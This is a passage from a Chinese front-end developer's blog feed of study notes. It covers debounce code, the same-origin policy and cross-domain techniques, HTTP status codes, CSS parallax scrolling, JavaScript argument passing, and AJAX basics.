class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> stamp = <span class="title function_">stampthrottle</span>(pri, <span class="number">500</span>);</span><br><span class="line">stampnode.<span class="title function_">addEventListener</span>(<span class="string">&#x27;keyup&#x27;</span>, <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">stamp</span>(e.<span class="property">target</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="2.2-防抖">2.2 防抖<a title="#2.2-防抖" href="#2.2-防抖"></a></h4><blockquote><p>将多次操作合并为一次操作进行。原理是维护一个计时器，规定在delay时间后触发函数，但是在delay时间内再次触发的话，就会取消之前的计时器而重新设置。</p></blockquote><ul><li><p>**非立即防抖：**指的是触发事件后函数不会立即执行，而是在 n 秒后执行，如果在 n 秒内又触发了事件，则会重新计算函数执行时间。</p></li><li><p><strong>立即防抖：</strong> 指的是触发事件后函数会立即执行，然后 n 秒内不触发事件才能继续执行函数的效果。</p><p>简而言之，立即执行版就是第一次事件触发后会立即执行，至少执行一次事件。</p></li></ul><h5 id="2.2.1-立即防抖">2.2.1 立即防抖<a title="#2.2.1-立即防抖" href="#2.2.1-立即防抖"></a></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> imnode = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.imdebounce&#x27;</span>);</span><br><span class="line"><span class="comment">// 立即防抖</span></span><br><span class="line"><span class="comment">// 指的是触发事件后函数会立即执行，n 秒内不触发事件才能继续执行函数的效果</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">imdebounce</span>(<span class="params">func, delay</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> timeout;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"><span class="variable language_">arguments</span></span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (timeout) &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(timeout);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> flag = !timeout;</span><br><span class="line">    timeout = <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="comment">// func.call(this, arguments);</span></span><br><span class="line">      timeout = <span class="literal">null</span>;</span><br><span class="line">    &#125;, delay)</span><br><span class="line">    <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">      func.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> im = <span class="title function_">imdebounce</span>(pri, <span class="number">500</span>);</span><br><span class="line">imnode.<span class="title function_">addEventListener</span>(<span class="string">&#x27;keyup&#x27;</span>, <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ; debugger</span></span><br><span class="line">  <span class="comment">// imdebounce(pri, 500)(e.target)   //就不可以为什么</span></span><br><span class="line">  </span><br><span class="line">  <span class="title function_">im</span>(e.<span class="property">target</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="2.2.2-非立即防抖">2.2.2 非立即防抖<a title="#2.2.2-非立即防抖" href="#2.2.2-非立即防抖"></a></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> unimnode = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.unimdebounce&#x27;</span>);</span><br><span class="line"><span class="comment">// 非立即防抖</span></span><br><span class="line"><span class="comment">// 高频触发时 如果 触发后 delay 没有再触发 就执行函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">unimdebounce</span>(<span class="params">func, delay</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> timeout;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"><span class="variable language_">arguments</span></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (timeout) &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(timeout);</span><br><span class="line">    &#125;</span><br><span class="line">    timeout = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      func.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">      timeout = <span class="literal">null</span>;</span><br><span class="line">    &#125;, delay)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> un = <span class="title function_">unimdebounce</span>(pri, <span class="number">500</span>);</span><br><span class="line">unimnode.<span class="title function_">addEventListener</span>(<span class="string">&#x27;keyup&#x27;</span>, <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">un</span>(e.<span class="property">target</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="2.2.3-结合版">2.2.3 结合版<a title="#2.2.3-结合版" href="#2.2.3-结合版"></a></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> bothnode = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.bothdebounce&#x27;</span>);</span><br><span class="line"><span class="comment">// 结合版</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">debounce</span>(<span class="params">func, delay = <span class="number">500</span>, immediate = <span class="literal">true</span></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> timeout;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"><span class="variable language_">arguments</span></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (timeout) &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(timeout);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (immediate) &#123;</span><br><span class="line">      <span class="comment">// 立即执行</span></span><br><span class="line">      <span class="keyword">let</span> flag = !timeout;</span><br><span class="line">      timeout = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        timeout = <span class="literal">null</span>;</span><br><span class="line">      &#125;, delay)</span><br><span class="line">      <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">        func.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 非立即执行</span></span><br><span class="line">      timeout = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        func.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        timeout = <span class="literal">null</span>;</span><br><span class="line">      &#125;, delay)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> both = <span class="title function_">debounce</span>(pri, <span class="number">500</span>, <span class="literal">false</span>);</span><br><span class="line">bothnode.<span class="title function_">addEventListener</span>(<span class="string">&#x27;keyup&#x27;</span>, <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">both</span>(e.<span class="property">target</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>同源策略</title>
      <link href="/furtherNotes/further/02%20%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%20%E8%B7%A8%E5%9F%9F"/>
      <url>/furtherNotes/further/02%20%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%20%E8%B7%A8%E5%9F%9F</url>
      
        <content type="html"><![CDATA[<blockquote><p>ajax 引申内容</p></blockquote><h3 id="0.-为什么会有同源策略">0. 为什么会有同源策略<a title="#0.-为什么会有同源策略" href="#0.-为什么会有同源策略"></a></h3><p><strong>简单来说是为了安全</strong></p><p>1.为了防止恶意网页可以获取其他网站的本地数据。</p><p>2.为了防止恶意网站<a href="https://so.csdn.net/so/search?q=iframe&amp;spm=1001.2101.3001.7020" target="_blank">iframe</a>其他网站的时候，获取数据。</p><p>3.为了防止恶意网站在自已网站有访问其他网站的权利，以免通过cookie免登，拿到数据。</p><h3 id="1.-同源策略">1. 同源策略<a title="#1.-同源策略" href="#1.-同源策略"></a></h3><p>指 “协议 + 域名 + 端口” 三者相同</p><p><strong>同源策略限制js能力，其限制的内容有：</strong></p><ul><li><p>Cookie、LocalStorage、indexedDB 等存储型内容</p></li><li><p>DOM 节点</p></li><li><p>AJAX 请求被浏览器拦截</p><blockquote><p>请求能发出去，服务器端能收到请求并正常返回结构，结果被浏览器拦截了</p></blockquote></li></ul><p>但<strong>所有 src 和 href 属性都不受同源策略限制</strong>，可以请求第三方服务器数据内容</p><h3 id="2.-什么情况会造成跨域">2. 什么情况会造成跨域<a title="#2.-什么情况会造成跨域" href="#2.-什么情况会造成跨域"></a></h3><p>当协议、子域名、主域名、端口号中</p><h3 id="3.-解决跨域的方式">3. 解决跨域的方式<a title="#3.-解决跨域的方式" href="#3.-解决跨域的方式"></a></h3><h5 id="3.1-jsonp：只能解决-get-跨域">3.1 jsonp：只能解决 get 跨域<a title="#3.1-jsonp：只能解决-get-跨域" href="#3.1-jsonp：只能解决-get-跨域"></a></h5><ul><li>原理：<strong>利用 script 标签的 src 属性不受同源策略限制。</strong> 网页可以得到从其他来源动态产生的 JSON 数据，jsonp 请求一定要对方的服务器做支持才可以。</li><li>步骤：<ol><li>创建 script 标签</li><li>src 设置 接口 url</li><li>接口参数必须要带一个自定义参数名 不然后台无法返回数据</li><li>通过定义函数名去接收后台返回数据</li></ol></li></ul><h5 id="3.2-cors：跨域资源共享">3.2 CORS：跨域资源共享<a title="#3.2-cors：跨域资源共享" href="#3.2-cors：跨域资源共享"></a></h5><ul><li>原理：<strong>服务器设置 Access-Control-Allow-Origin 响应头后，浏览器会允许跨域请求</strong></li><li>限制：浏览器需要支持 html5 ，可以支持 post put 等方法，兼容ie9 以上</li></ul><blockquote><p>后台设置：</p><p>Access-Control-Allow-Origin：*                          允许所有域名访问</p><p>Access-Control-Allow-Origin：<a href="http://a.com">http://a.com</a>      只允许 <a href="http://a.com">a.com</a> 访问</p></blockquote><ul><li><p>使用这种方式解决跨域问题，会在发送请求时出现两种情况，分别为 <strong>简单请求</strong> 和 <strong>复杂请求</strong></p><ul><li><p><strong>简单请求</strong>：使用 GET、HEAD、POST 或者</p><p>​                    Content-Type 的值仅限于 text\plain、multipart/form-data、application/x-www-form-urlencoded</p><blockquote><p>请求中的任意 XMLHttpRequestUpload 对象均没有注册任何事件监听器</p><p>可以使用 XMLHttpRequest.upload 属性监听</p></blockquote></li><li><p><strong>复杂请求</strong>：不符合上述两个要求的请求。复杂请求的 cors 请求，会在正式通信之前，增加一次 http 查询请求，称为“预检”请求，该请求时 option 方法的，通过该请求来知道服务器是否允许跨域请求</p></li></ul></li></ul><h5 id="3.3-postmessage">3.3 postMessage<a title="#3.3-postmessage" href="#3.3-postmessage"></a></h5><p>是 html5 XMLHttpRequest level2 中的 api，且是为数不多的可以跨域操作的 window 属性之一</p><p>可以解决：</p><ul><li>页面和其打开的新窗口的数据传递</li><li>多窗口之间消息传递</li><li>页面与嵌套的iframe消息传递</li><li>上面三个场景的跨域数据传递</li></ul><p>postMessage() 方法允许来自不同源的脚本采用异步方式进行有限的通信，可以实现跨文档、多窗口、跨域消息传递。</p><p><code>otherWindow.postMessage(message, targetOrigin, [transfer]);</code></p><h5 id="3.4-websocket">3.4 websocket<a title="#3.4-websocket" href="#3.4-websocket"></a></h5><h5 id="3.5-node-中间件代理">3.5 node 中间件代理<a title="#3.5-node-中间件代理" href="#3.5-node-中间件代理"></a></h5><h5 id="3.6-nginx-反向代理">3.6 nginx 反向代理<a title="#3.6-nginx-反向代理" href="#3.6-nginx-反向代理"></a></h5><h5 id="3.7-window.name-+-iframe">3.7 <a href="http://window.name">window.name</a> + iframe<a title="#3.7-window.name-+-iframe" href="#3.7-window.name-+-iframe"></a></h5><h5 id="3.8-location.hash-+-iframe">3.8 location.hash + iframe<a title="#3.8-location.hash-+-iframe" href="#3.8-location.hash-+-iframe"></a></h5><h5 id="3.9--document.domain-+-iframe">3.9  document.domain + iframe<a title="#3.9--document.domain-+-iframe" href="#3.9--document.domain-+-iframe"></a></h5><ul><li><p>原理：**相同主域名不同子域名下的页面，给页面设置 document.domain 为基础主域，实现同域 **</p><blockquote><p>(二级域名相同的请求下  <a href="http://a.text.com">a.text.com</a>  <a href="http://b.text.com">b.text.com</a>),给页面强制添加 document.domain = ‘<a href="http://text.com">text.com</a>’ 表示二级域名都相同就可以实现跨域</p></blockquote></li><li><p>限制：同域 document 提供的是页面间的互操作，需要载入 iframe 页面</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// a.html</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> helloa</span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://b.zf1.cn:3000/b.html&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;load()&quot;</span> <span class="attr">id</span>=<span class="string">&quot;frame&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">domain</span> = <span class="string">&#x27;zf1.cn&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">load</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(frame.<span class="property">contentWindow</span>.<span class="property">a</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// b.html</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   hellob</span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">     <span class="variable language_">document</span>.<span class="property">domain</span> = <span class="string">&#x27;zf1.cn&#x27;</span></span></span><br><span class="line"><span class="language-javascript">     <span class="keyword">var</span> a = <span class="number">100</span>;</span></span><br><span class="line"><span class="language-javascript">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="6.4-用apache做转发（逆向代理），让跨域变成同域">6.4 用Apache做转发（逆向代理），让跨域变成同域<a title="#6.4-用apache做转发（逆向代理），让跨域变成同域" href="#6.4-用apache做转发（逆向代理），让跨域变成同域"></a></h5>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP 常见状态码</title>
      <link href="/furtherNotes/further/02%20%E5%B8%B8%E8%A7%81%E7%8A%B6%E6%80%81%E7%A0%81"/>
      <url>/furtherNotes/further/02%20%E5%B8%B8%E8%A7%81%E7%8A%B6%E6%80%81%E7%A0%81</url>
      
        <content type="html"><![CDATA[<blockquote><p>ajax 引申</p></blockquote><h4 id="1xx-信息性-—-接收的请求正在处理">1xx 信息性 — 接收的请求正在处理<a title="#1xx-信息性-—-接收的请求正在处理" href="#1xx-信息性-—-接收的请求正在处理"></a></h4><h4 id="2xx-成功-—-请求正常处理完毕">2xx 成功 — 请求正常处理完毕<a title="#2xx-成功-—-请求正常处理完毕" href="#2xx-成功-—-请求正常处理完毕"></a></h4><ul><li>200 OK</li><li>204 No Content   请求处理成功，返回的响应报文中 不含也不允许有 实体的主体部分，即无资源返回</li><li>206 Partial Content  客户端进行了范围请求，响应报文包含由Content-Range 指定范围的实体内容。</li></ul><h4 id="3xx-重定向-—-需要进行附加操作以完成请求">3xx 重定向 — 需要进行附加操作以完成请求<a title="#3xx-重定向-—-需要进行附加操作以完成请求" href="#3xx-重定向-—-需要进行附加操作以完成请求"></a></h4><ul><li><p>301 Moved Permanently 永久重定向</p></li><li><p>302 Found 临时重定向</p></li><li><p>303 See Other 因请求对应的资源存在着另一个 URI，应使用 GET 方法定向获取请求的资源</p><blockquote><p>于302 功能相同，但明确表示采用 get 获取资源</p></blockquote></li><li><p>304 Not Modified 发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况</p></li><li><p>307 Temporary Redirect 临时重定向</p><blockquote><p>302 禁止 post 换成 get，但实际不遵守；307 会遵守浏览器标准，不会从 post 变成 get</p></blockquote></li></ul><h4 id="4xx-客户端错误-—-服务器无法处理请求">4xx 客户端错误 — 服务器无法处理请求<a title="#4xx-客户端错误-—-服务器无法处理请求" href="#4xx-客户端错误-—-服务器无法处理请求"></a></h4><ul><li><p>400 Bad Request 请求报文中存在语法错误</p></li><li><p>401 Unauthorized 发送的请求需要有通过 HTTP 认证的认证信息。</p><blockquote><p>第二次返回402表示用户认证失败。</p></blockquote></li><li><p>403 Forbidden 对请求资源的访问被服务器拒绝了</p></li><li><p>404 Not Found 服务器无法找到请求的资源</p></li></ul><h4 id="5xx-服务器错误-—-服务器处理请求出错">5xx 服务器错误 — 服务器处理请求出错<a title="#5xx-服务器错误-—-服务器处理请求出错" href="#5xx-服务器错误-—-服务器处理请求出错"></a></h4><ul><li>500 Internal Server Error 服务端在执行请求时发生了错误</li><li>503 Service Unavailable 服务器暂时处于超负载或正在进行停机维护，无法处理请求</li></ul>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>视差滚动</title>
      <link href="/furtherNotes/further/03%20%E8%A7%86%E5%B7%AE%E6%BB%9A%E5%8A%A8"/>
      <url>/furtherNotes/further/03%20%E8%A7%86%E5%B7%AE%E6%BB%9A%E5%8A%A8</url>
      
        <content type="html"><![CDATA[<h3 id="1.-简介">1. 简介<a title="#1.-简介" href="#1.-简介"></a></h3><p><strong>视差滚动</strong>（Parallax Scrolling）是指让多层背景以不同的速度移动，形成立体的运动效果，带来非常出色的视觉体验。 作为网页设计的热点趋势，越来越多的网站应用了这项技术。</p><h3 id="2.-css-background-attachment">2. css background-attachment<a title="#2.-css-background-attachment" href="#2.-css-background-attachment"></a></h3><p><code>background-attachment</code>：决定背景图像的位置是在视口内固定，或者随着包含它的区块滚动</p><ul><li><p><strong>scroll</strong> ( 默认 ) : 背景相对于元素本身固定，而不是随着内容滚动</p><blockquote><p>背景铺满 元素盒子可视位置，内容溢出 流动条，拉滚动条，背景不动，只动内容</p></blockquote></li><li><p><strong>local</strong>：背景相对于元素的内容固定。背景会随着元素内容滚动，并且背景的绘制区域和定位区域是相对于可滚动的区域而不是包含他们的边框。</p><blockquote><p>背景铺满  元素可视 or 流动条隐藏部分，相当于内容与背景的相对位置静止。</p></blockquote></li><li><p><strong>fixed</strong>：背景相对于视口固定。背景不会随着元素的内容滚动。</p></li></ul><p>视察滚动的实现：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.g-img</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">...</span>);</span><br><span class="line">    <span class="attribute">background-attachment</span>: fixed;</span><br><span class="line">    <span class="attribute">background-size</span>: cover;</span><br><span class="line">    <span class="attribute">background-position</span>: center center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3.-transform：translate3d">3. transform：translate3d<a title="#3.-transform：translate3d" href="#3.-transform：translate3d"></a></h3><ol><li><p>我们给容器设置上 <code>transform-style: preserve-3d</code> 和 <code>perspective: xpx</code>，那么处于这个容器的子元素就将位于3D空间中，</p></li><li><p>再给子元素设置不同的 <code>transform: translateZ()</code>，这个时候，不同元素在 3D Z轴方向距离屏幕（我们的眼睛）的距离也就不一样</p></li><li><p>滚动滚动条，由于子元素设置了不同的 <code>transform: translateZ()</code>，那么他们滚动的上下距离 <code>translateY</code> 相对屏幕（我们的眼睛），也是不一样的，这就达到了滚动视差的效果。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>展开讲讲红宝书提到的“es中...按值传递”</title>
      <link href="/furtherNotes/further/01%20es%20%E4%B8%AD%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0%E9%83%BD%E6%98%AF%E6%8C%89%E5%80%BC%E4%BC%A0%E9%80%92%E7%9A%84"/>
      <url>/furtherNotes/further/01%20es%20%E4%B8%AD%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0%E9%83%BD%E6%98%AF%E6%8C%89%E5%80%BC%E4%BC%A0%E9%80%92%E7%9A%84</url>
      
        <content type="html"><![CDATA[<blockquote><p>第4版红宝书 4.1 提到 ECMAScript 中所有函数的值都是按值传递的</p></blockquote><h3 id="按值传递">按值传递<a title="#按值传递" href="#按值传递"></a></h3><blockquote><p>原始值 很好理解，就是将值拷贝一份 成为参数，这个参数与外界原来的值，就没有任何联系了</p></blockquote><p>这里展开讲讲引用值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123; </span><br><span class="line">    <span class="attr">age</span>: <span class="number">18</span> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span> (per) &#123;</span><br><span class="line">    per.<span class="property">age</span>++;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(per);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">add</span>(person);        <span class="comment">// &#123; age: 19 &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person) <span class="comment">// &#123; age: 19 &#125;</span></span><br></pre></td></tr></table></figure><p>这个例子的输出结果显然 就不符合 <strong>按值传递</strong>，是不是意味着 应该是 <strong>按引用传递</strong>呢？我们再看一个例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;</span><br><span class="line">    <span class="attr">age</span>: <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">per</span>)&#123;</span><br><span class="line">    per = <span class="number">20</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(per);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">add</span>(person);         <span class="comment">//20</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person); <span class="comment">// &#123; age: 18 &#125;</span></span><br></pre></td></tr></table></figure><p>这个例子的输出结果就有点 <strong>按值传递</strong> 了。</p><p>那为什么会有这两种这么迷惑的结果呢？这就引出了第三种值的传递方式：<strong>按共享传递</strong>。</p><p>顺便回顾下我们上面有说到的两种值的传递方式：</p><ul><li><p><strong>按值传递</strong>：把值复制给另一个变量</p></li><li><p><strong>按引用传递</strong>：把引用对象传给另一个变量，想到于两个变量指向同一个引用</p></li><li><p><strong>按共享传递</strong>：把对象的引用副本传递给另一个变量</p></li></ul><p><strong>所以，就上面的例子来说，修改 <code>per.age</code> 会直接修改到原值，但直接修改 <code>per</code> 并不会修改原值。</strong></p><p>其实拷贝副本也算是一种值的拷贝，所以红宝书直接认为是按值传递也没有说不过去。</p><p>总结：若参数为 原始类型 就是  按值传递，若参数为 引用类型 就是 按共享传递</p>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ajax</title>
      <link href="/furtherNotes/further/02%20ajax"/>
      <url>/furtherNotes/further/02%20ajax</url>
      
        <content type="html"><![CDATA[<h2 id="ajax">ajax<a title="#ajax" href="#ajax"></a></h2><h3 id="1.简介">1.简介<a title="#1.简介" href="#1.简介"></a></h3><p>ajax(asynchronous javascript and xml) 异步 js 与 xml</p><p>一种创建交互式网页应用的网页开发技术</p><p>使用异步方式与服务器通信，不需要打断用户操作</p><p>在不刷新整个网页情况下，与服务器通信交互</p><h3 id="2.-特点">2. 特点<a title="#2.-特点" href="#2.-特点"></a></h3><ul><li><p>优点：可以不刷新页面与服务端进行通信</p><p>​           允许根据用户事件来更新部分页面内容</p></li><li><p>缺点：没有浏览记录，不能回退</p><p>​            存在同源跨域问题</p><p>​             seo不友好</p></li></ul><h3 id="3.-原生ajax使用">3. 原生ajax使用<a title="#3.-原生ajax使用" href="#3.-原生ajax使用"></a></h3><ol><li><p>创建对象</p></li><li><p>初始化 设置请求方法和url</p></li><li><p>发送 设置参数</p><blockquote><p>get：请求数据拼在 url 中</p><p>post：设置请求头 格式内容 + 请求数据放在 send 里</p><p>​           xhr.setRequestHeader(“Content-type”,“application/x-www-form-urlencoded”);</p></blockquote></li><li><p>事件绑定 处理服务端返回结果</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> xml = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="property">responseType</span> = <span class="string">&#x27;json&#x27;</span>;   <span class="comment">// open前 设置响应体数据</span></span><br><span class="line">xhr.<span class="property">timeout</span> = <span class="number">2000</span>;</span><br><span class="line">xhr.<span class="property">ontimeout</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;...&#125;</span><br><span class="line">xhr.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;...&#125;</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>,<span 